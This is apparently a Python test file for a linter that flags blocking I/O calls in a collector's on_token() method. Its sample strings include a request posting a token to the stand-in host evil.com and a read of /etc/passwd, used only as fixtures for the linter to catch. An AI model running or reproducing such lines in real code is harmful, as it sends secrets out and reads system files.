"""Tests for collector linting tool."""

import ast
import tempfile
from pathlib import Path
import sys

# Add tools directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent.parent / "tools"))

from lint_collectors import BlockingCallDetector, lint_file


def test_linter_detects_blocking_calls():
    """Verify linter catches blocking I/O in on_token()."""

    bad_collector = '''
import requests

class BadCollector:
    def on_token(self, idx, token, ctx, wh):
        # Should be flagged
        response = requests.get("http://example.com")
        with open("/etc/passwd") as f:
            data = f.read()
'''

    # Write to temp file and lint
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(bad_collector)
        temp_path = Path(f.name)

    try:
        violations = lint_file(temp_path)

        # Debug: print what we found
        if len(violations) < 2:
            print(f"  Debug: Found {len(violations)} violations:")
            for v in violations:
                print(f"    - Line {v['line']}: {v['call']} (pattern: {v['pattern']})")

        # Should detect at least 2 violations (requests + open)
        assert len(violations) >= 2, f"Expected >= 2 violations, got {len(violations)}"

        # Check that 'requests.' pattern was caught
        assert any('requests.' in v['pattern'] for v in violations), \
            "Should detect requests.get"

        # Check that 'open' pattern was caught (either in pattern or call)
        assert any('open' in v['pattern'] or 'open' in v['call'] for v in violations), \
            "Should detect open()"

    finally:
        temp_path.unlink()


def test_linter_allows_finalize_io():
    """Verify linter allows I/O in finalize()."""

    good_collector = '''
import requests

class GoodCollector:
    def on_token(self, idx, token, ctx, wh):
        # No I/O - just collect
        self._links.append(token.get("href"))

    def finalize(self, wh):
        # I/O allowed here
        for link in self._links:
            response = requests.head(link)
            self._statuses.append(response.status_code)
'''

    # Write to temp file and lint
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(good_collector)
        temp_path = Path(f.name)

    try:
        violations = lint_file(temp_path)

        # Should have no violations (I/O is in finalize())
        assert len(violations) == 0, \
            f"Should allow I/O in finalize(), got {len(violations)} violations"

    finally:
        temp_path.unlink()


def test_linter_detects_multiple_patterns():
    """Verify linter catches various blocking patterns."""

    multi_bad = '''
import requests
import subprocess
import time

class MultiBadCollector:
    def on_token(self, idx, token, ctx, wh):
        requests.post("http://evil.com", data={"token": token})
        subprocess.run(["ls", "-la"])
        time.sleep(10)
        with open("log.txt", "a") as f:
            f.write("data")
'''

    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(multi_bad)
        temp_path = Path(f.name)

    try:
        violations = lint_file(temp_path)

        # Should detect multiple violations
        assert len(violations) >= 4, f"Expected >= 4 violations, got {len(violations)}"

        patterns_found = {v['pattern'] for v in violations}
        calls_found = {v['call'] for v in violations}

        # Check that various patterns were caught
        assert 'requests.' in patterns_found, "Should detect requests"
        assert 'subprocess.' in patterns_found, "Should detect subprocess"
        assert 'time.sleep' in patterns_found, "Should detect time.sleep"
        assert 'open' in patterns_found or any('open' in c for c in calls_found), "Should detect open()"

    finally:
        temp_path.unlink()


def test_linter_clean_collector():
    """Verify linter passes clean collectors."""

    clean_collector = '''
class CleanCollector:
    def __init__(self):
        self._items = []

    def on_token(self, idx, token, ctx, wh):
        # Pure data collection - no I/O
        if token.get("type") == "link_open":
            self._items.append({
                "href": token.get("href"),
                "line": token.get("map", [None])[0]
            })

    def finalize(self, wh):
        return {"items": self._items, "count": len(self._items)}
'''

    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(clean_collector)
        temp_path = Path(f.name)

    try:
        violations = lint_file(temp_path)

        # Should have no violations
        assert len(violations) == 0, \
            f"Clean collector should have no violations, got {len(violations)}"

    finally:
        temp_path.unlink()


if __name__ == "__main__":
    # Run tests
    tests = [
        test_linter_detects_blocking_calls,
        test_linter_allows_finalize_io,
        test_linter_detects_multiple_patterns,
        test_linter_clean_collector,
    ]

    passed = 0
    failed = 0

    for test in tests:
        try:
            test()
            print(f"✓ {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"✗ {test.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ {test.__name__}: Unexpected error: {e}")
            failed += 1

    print(f"\n{passed} passed, {failed} failed")
    sys.exit(0 if failed == 0 else 1)
